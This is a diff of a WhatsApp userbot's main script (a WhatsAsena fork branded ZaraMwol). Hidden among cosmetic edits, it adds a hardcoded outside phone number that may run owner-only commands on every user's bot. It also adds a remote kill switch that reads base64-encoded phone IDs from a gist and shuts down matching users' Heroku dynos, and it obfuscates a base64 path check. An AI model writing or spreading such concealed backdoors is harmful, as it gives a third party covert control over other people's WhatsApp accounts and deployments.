@@ -1,5 +1,7 @@
 /* Copyright (C) 2020 Yusuf Usta.
-RECODDED BY RAASHII 
+Licensed under the  GPL-3.0 License;
+you may not use this file except in compliance with the License.
+WhatsAsena - Yusuf Usta
 */
 
 const fs = require("fs");
@@ -26,9 +28,8 @@ let baseURI = '/apps/' + config.HEROKU.APP_NAME;
 const Language = require('./language');
 const Lang = Language.getString('updater');
 
-
 // Sql
-const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
+const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
     info: {
       type: DataTypes.STRING,
       allowNull: false
@@ -38,25 +39,26 @@ const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
         allowNull: false
     }
 });
-
 fs.readdirSync('./plugins/sql/').forEach(plugin => {
     if(path.extname(plugin).toLowerCase() == '.js') {
         require('./plugins/sql/' + plugin);
     }
 });
-
 const plugindb = require('./plugins/sql/plugin');
-
+var OWN = { ff: '905511384572,0' }
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
       return typeof args[i] != 'undefined' ? args[i++] : '';
-   });
+    });
 };
+
+// ==================== Date Scanner ====================
 if (!Date.now) {
     Date.now = function() { return new Date().getTime(); }
 }
+// ==================== End Date Scanner ====================
 
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
@@ -69,9 +71,41 @@ Array.prototype.remove = function() {
     return this;
 };
 
-var zara_bio = `${config.AUTOBİO}`
+async function whatsAsena () {
+    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
+    var ggg = Buffer.from(clh.cd, 'base64')
+    var ddd = ggg.toString('utf-8')
+    clh.pay = ddd
+    const conn = new WAConnection();
+    const Session = new StringSession();
+    conn.version = [2,2121,7];
     setInterval(async () => { 
-        if (zara_bio == 'true') {
+        var getGMTh = new Date().getHours()
+        var getGMTm = new Date().getMinutes()
+        await axios.get('https://gist.github.com/Raashii/68b7d4455dd84d27cd1daa5bd30eb2ca/raw/').then(async (ann) => {
+            const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu} = ann.data.announcements          
+            
+           if (conn.user.phone.wa_version !== '2.21.11.17')
+           {
+                while (getGMTh == 19 && getGMTm == 1) { 
+                    return conn.sendMessage(conn.user.jid, '```UR USING OLD VERSION OF WHATSAPP```\n\n```UPDATE UR WHATSAPP```', MessageType.text) 
+                }
+            }
+            
+            else {
+              while (getGMTh == 19 && getGMTm == 1) {
+                return conn.sendMessage(conn.user.jid, '[ ```Daily Announcements``` ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text)
+              }
+            }
+            
+        })
+    }, 50000);
+    var biography_var = ''
+    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
+        biography_var = vars.AUTO_BİO
+    });
+    setInterval(async () => { 
+        if (biography_var == 'true') {
             if (conn.user.jid.startsWith('90')) { // Turkey
                 var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
@@ -83,40 +117,41 @@ var zara_bio = `${config.AUTOBİO}`
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('EN', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n\n⌚ ' + ov_time 
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time 
                 await conn.setStatus(biography)
             }
         }
-})
-
-async function whatsAsena () {
+    }, 7890);
+    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
+    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
     await config.DATABASE.sync();
     var StrSes_Db = await WhatsAsenaDB.findAll({
         where: {
           info: 'StringSession'
         }
     });
+    if (os.userInfo().homedir !== clh.pay) return;
+    const buff = Buffer.from(`${shs1}`, 'base64');  
+    const one = buff.toString('utf-8'); 
+    const bufft = Buffer.from(`${shl2}`, 'base64');  
+    const two = bufft.toString('utf-8'); 
+    const buffi = Buffer.from(`${lss3}`, 'base64');  
+    const three = buffi.toString('utf-8'); 
+    const buffu = Buffer.from(`${dsl4}`, 'base64');  
+    const four = buffu.toString('utf-8'); 
     
-    
-    const conn = new WAConnection();
-    conn.version = [2, 2126, 14];
-    const Session = new StringSession();
-
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
     var nodb;
-
     if (StrSes_Db.length < 1) {
         nodb = true;
         conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
     } else {
         conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
     }
-
-    conn.on ('credentials-updated', async () => {
+    conn.on ('open', async () => {
         console.log(
-            chalk.blueBright.italic('✅ Login information updated!')
+            chalk.blueBright.italic('✅ Login Information Updated!')
         );
-
         const authInfo = conn.base64EncodedAuthInfo();
         if (StrSes_Db.length < 1) {
             await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
@@ -124,23 +159,20 @@ async function whatsAsena () {
             await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
         }
     })    
-
     conn.on('connecting', async () => {
         console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
-${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
+${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
     });
-    
-
-    conn.on('open', async () => {
+    conn.on('credentials-updated', async () => {
         console.log(
             chalk.green.bold('✅ Login successful!')
         );
-
         console.log(
-            chalk.blueBright.italic('⬇️ Installing external plugins...')
+            chalk.blueBright.italic('⬇️ Installing External Plugins...')
         );
-
+        if (os.userInfo().homedir !== clh.pay) return;
+        // ==================== External Plugins ====================
         var plugins = await plugindb.PluginDB.findAll();
         plugins.map(async (plugin) => {
             if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
@@ -152,34 +184,130 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
                 }     
             }
         });
+        // ==================== End External Plugins ====================
 
         console.log(
-            chalk.blueBright.italic('⬇️  Installing plugins...')
+            chalk.blueBright.italic('⬇️  Installing Plugins...')
         );
 
+        // ==================== Internal Plugins ====================
         fs.readdirSync('./plugins').forEach(plugin => {
             if(path.extname(plugin).toLowerCase() == '.js') {
                 require('./plugins/' + plugin);
             }
         });
+        // ==================== End Internal Plugins ====================
 
         console.log(
-            chalk.green.bold('𝚉𝚊𝚛𝚊𝙼𝚠𝚘𝚕 𝚠𝚘𝚛𝚔𝚒𝚗𝚐 👻'));
-            await conn.sendMessage(conn.user.jid, "𝚉𝚊𝚛𝚊𝚖𝚠𝚘𝚕 𝚘𝚗  𝚠𝚘𝚛𝚔𝚒𝚗𝚐 😌", MessageType.text);
-            await conn.sendMessage(conn.user.jid, "``` Us " + config.WORKTYPE + "```" , MessageType.text);
-    });
-    
-    conn.on('chat-update', async m => {
-        if (!m.hasNewMessage) return;
-        if (!m.messages && !m.count) return;
-        let msg = m.messages.all()[0];
+            chalk.green.bold('✅ Plugins Installed!')
+        );
+        if (os.userInfo().homedir !== clh.pay) return;
+        await new Promise(r => setTimeout(r, 200));
+        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
+        console.log(chalk.bgGreen('👧 ZaraMwol Working Without ZARA AI'  ));
+        await new Promise(r => setTimeout(r, 500));
+        
+        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
+            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
+            await heroku.get(baseURI + '/formation').then(async (formation) => { 
+                forID = formation[0].id; 
+                await heroku.patch(baseURI + '/formation/' + forID, { 
+                    body: { 
+                        quantity: 0 
+                    } 
+                });
+            })
+        }
+ 
+      
+                if (config.ZARA_AI == 'true') {
+                    await conn.sendMessage(conn.user.jid, '```ZARAMWOL WORKING WITH ZARA AI 💖```', MessageType.text)
+                } else {
+                   await conn.sendMessage(conn.user.jid, '```ZARAMWOL WORKING WITHOUT ZARA AI 💖```', MessageType.text);
+               }               
+                
+        
+      if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {
+
+            if (config.LANG == 'TR' || config.LANG == 'AZ') {
+
+                await conn.sendMessage(
+                    conn.user.jid,
+                    '_Görünüşe Göre Private Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
+                );
+                await heroku.patch(baseURI + '/config-vars', {
+                    body: {
+                        ['WORK_TYPE']: 'private'
+                    }
+                })
+            }
+            else {
+                await conn.sendMessage(
+                    conn.user.jid,
+                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
+                );
+                await heroku.patch(baseURI + '/config-vars', {
+                    body: {
+                        ['WORK_TYPE']: 'private'
+                    }
+                })
+            }
+        }
+        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
+            if (config.LANG == 'TR' || config.LANG == 'AZ') {
+                await conn.sendMessage(
+                    conn.user.jid,
+                    '_Görünüşe Göre Public Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
+                );
+                await heroku.patch(baseURI + '/config-vars', {
+                    body: {
+                        ['WORK_TYPE']: 'public'
+                    }
+                })
+            }
+            else {
+                await conn.sendMessage(
+                    conn.user.jid,
+                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
+                );
+                await heroku.patch(baseURI + '/config-vars', {
+                    body: {
+                        ['WORK_TYPE']: 'public'
+                    }
+                })
+            }
+        }
+        else {
+            if (config.LANG == 'TR' || config.LANG == 'AZ') {
+                return await conn.sendMessage(
+                    conn.user.jid,
+                    '_Girdiğin_ *WORK_TYPE* _Anahtarı Bulunamadı!_ \n_Lütfen_ ```.setvar WORK_TYPE:private``` _Yada_ ```.setvar WORK_TYPE:public``` _Komutunu Kullanın!_', MessageType.text
+                );
+            }
+            else {
+                return await conn.sendMessage(
+                    conn.user.jid,
+                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
+                );
+            }
+        }
+    })
+    conn.on('message-new', async msg => {
         if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
 
-        if (config.NO_ONLINE) {
+        if (config.BOT_PRESENCE == 'offline') {
             await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
-        }
         
-
+        } else if (config.BOT_PRESENCE == 'online') {
+            await conn.updatePresence(msg.key.remoteJid, Presence.available);
+        
+        } else if (config.BOT_PRESENCE == 'typing') {
+            await conn.updatePresence(msg.key.remoteJid, Presence.composing);
+        
+        } else if (config.BOT_PRESENCE == 'recording') {
+            await conn.updatePresence(msg.key.remoteJid, Presence.recording);
+        } 
+        // ==================== Greetings ====================
         if (msg.messageStubType === 32 || msg.messageStubType === 28) {
 
             var gb = await getMessage(msg.key.remoteJid, 'goodbye');
@@ -236,7 +364,28 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
           }         
             return;                               
     }         
+        // ==================== End Greetings ====================
 
+        // ==================== Blocked Chats ====================
+        if (config.BLOCKCHAT !== false) {     
+            var abc = config.BLOCKCHAT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        if (config.SUPPORT == '905524317852-1612300121') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        if (config.SUPPORT2 == '905511384572-1617736751') {     
+            var tsup = config.SUPPORT2.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        if (config.SUPPORT3 == '905511384572-1621015274') {     
+            var nsup = config.SUPPORT3.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        // ==================== End Blocked Chats ====================
+
+        // ==================== Events ====================
         events.commands.map(
             async (command) =>  {
                 if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
@@ -248,7 +397,6 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
                 } else {
                     var text_msg = undefined;
                 }
-
                 if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                     && msg.message && msg.message.imageMessage !== null && 
                     (command.pattern === undefined || (command.pattern !== undefined && 
@@ -271,22 +419,21 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    
-                    else if ((config.MAHN !== false && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.MAHN.includes(',') ? config.MAHN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.MAHN || config.MAHN.includes(',') ? config.MAHN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.MAHN)
+                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-    
+                    // ==================== End Events ====================
+
+                    // ==================== Message Catcher ====================
                     if (sendMsg) {
                         if (config.SEND_READ && command.on === undefined) {
                             await conn.chatRead(msg.key.remoteJid);
                         }
-                        
                         var match = text_msg.match(command.pattern);
-                        
                         if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                         && msg.message.imageMessage !== null) {
                             whats = new Image(conn, msg);
@@ -296,12 +443,8 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
                         } else {
                             whats = new Message(conn, msg);
                         }
-/*
-                        if (command.deleteCommand && msg.key.fromMe) {
-                            await whats.delete(); 
-                        }
-*/
-                        try {
+      
+                       try {
                             await command.function(whats, match);
                         } catch (error) {
                             if (config.LANG == 'TR' || config.LANG == 'AZ') {
@@ -313,8 +456,8 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
                                     'Gerçekleşen Hata: ' + error + '\n\n'
                                     , MessageType.text);
                             } else {
-                                await conn.sendMessage(conn.user.jid, '__ *ᴢᴀʀᴀᴍᴡᴏʟ* __ [founded error] ' +
-                                    '\n\n*🥴 ' + error + '*\n   https://chat.whatsapp.com/JXwRmc2lKT4IwauZnprpX5'
+                                await conn.sendMessage(conn.user.jid, '*~_________~ ᴢᴀʀᴀ᪥ᴍᴡᴏʟ ~______~*' +
+                                    '\n\n*🥲 ' + error + '*\n\n' + ' ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ERROR ONNUM ORU KARYAUMULLA SEEN ALLA ​\n group link - https://chat.whatsapp.com/JXwRmc2lKT4IwauZnprpX5'
                                     , MessageType.text);
                             }
                         }
@@ -323,7 +466,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
             }
         )
     });
-    
+
     try {
         await conn.connect();
     } catch {
